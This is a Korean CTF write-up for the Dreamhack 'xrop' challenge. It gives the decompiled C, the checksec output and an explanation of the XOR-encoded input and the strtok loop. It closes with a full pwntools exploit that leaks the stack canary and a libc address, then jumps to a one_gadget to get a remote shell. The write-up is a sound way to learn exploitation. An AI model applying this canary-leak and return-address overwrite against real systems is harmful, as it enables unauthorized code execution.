'''c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int i; // [rsp+8h] [rbp-28h]
  int v5; // [rsp+Ch] [rbp-24h]
  char buf[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v7; // [rsp+28h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  setvbuf(stdin, nullptr, 2, 0);
  setvbuf(stdout, nullptr, 2, 0);
  setvbuf(stderr, nullptr, 2, 0);
  do
  {
    printf("Input: ");
    v5 = read(0, buf, 0x100u);
    for ( i = 1; i < v5; ++i )
      buf[i - 1] ^= buf[i];
    printf("You entered: %s\n", buf);
  }
  while ( strtok(buf, "exit") );
  return 0;
}
'''
위 코드에서 strtok은 입력한 값이 아닌 입력한 값이 xor 처리된 buf 안에서 exit각각을 찾아 null로 바꾸고 토큰 포인터를 반환함 루프를 돌떄마다 buf의 처음 부분부터 검사함
예시
abcdexit #루프 안 끝남
ex # 루프 끝남
x #루프 끝남

exit 한개의 문자열이 delimiter가 아니라 e, x, i, t각각이 delimiter이기 떄문에
'''
@apublicccnt-cmyk ➜ /workspaces/pwnable/xrop/deploy (main) $ checksec prob
[*] '/workspaces/pwnable/xrop/deploy/prob'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
'''


근데 SHSTK이 켜져 있는데 해당 보호기법은 쉐도우 스택이라는 것이며 인텔 CET에 포함된 하드웨어 기반 반환주소 보호기법
-> 반환소를 일반 스택뿐만 아니라 하드웨어가 관리하는 별도의 새도우 스택에도 반환주소 복사본을 저장함
-> 함수가 반환할떄 일반 스택의 반환 주소와 섀도우 스택의 값을 비교함
-> 버퍼 오버플로우 등으로 일반 스택의 반환 주소가 변조되어 구 값이 다르면 제어 흐름 탈취(ROP등)로 간주하고 예욀ㄹ 발생시켜 실행을 막음
BUT
CPU(CET지원 세대), 운영체제 커널(linux 6.6이상), 바이너리(컴파일러/링크 옵션 적용) 3개 모두 만족해야 작동 가능함


헤딩 문제는 저 3개 중에 하나가 만족하지 않아서 다행히 작동을 하지 않아 ROP 공격이 가능


해당 문제는 우리가 원하는 값이 있으면
65 66 67 68

입력 값으로 
65 xor 66 xor 67 xor 68
      66 xor 67 xor 68
            67 xor 68
                  68
그럼 우리가 원하는 값을 얻을수 있음

docker 를 파서 해당 문제의 libc 파일을 가져오면 됨
가져오고 one_gadget으로 가져와서 셸을 얻으면 된다
'''
from pwn import *

def calc_payload(input: bytes) -> bytes:
    barr = bytearray(input)

    l = len(input)

    for i in range(l):
        x = 0
        for j in range(i, l):
            x ^= barr[j]
        barr[i] = x

    return barr

context.arch = "amd64"  # i386
context.log_level = "debug"

# p = gdb.debug(
#     "./prob_patched",
#     """
# b main
# brva 0x12FB
# c
# b *do_system+0x17A
# c
# """,
# )
p = remote("host3.dreamhack.games", 15530)

plain = b"A" * 0x18 + b"B"
payload = calc_payload(plain)
p.sendafter(b"Input: ", payload)

p.recvuntil(plain)
canary = u64(b"\x00" + p.recv(7))

plain = b"A" * 0x28
payload = calc_payload(plain)
p.sendafter(b"Input: ", payload)

p.recvuntil(plain)
libc_leak = u64(p.recv(6) + b"\x00" * 2) - 0x29D90
one_gadget = libc_leak + 0x50A30

print(hex(libc_leak))

plain = b"A" * 0x18
plain += p64(canary)
plain += b"\x00" * 0x08
plain += p64(one_gadget)
payload = calc_payload(plain)
p.sendafter(b"Input: ", payload)

plain = b"exit\x00"
payload = calc_payload(plain)
p.sendafter(b"Input: ", payload)

p.interactive()
'''
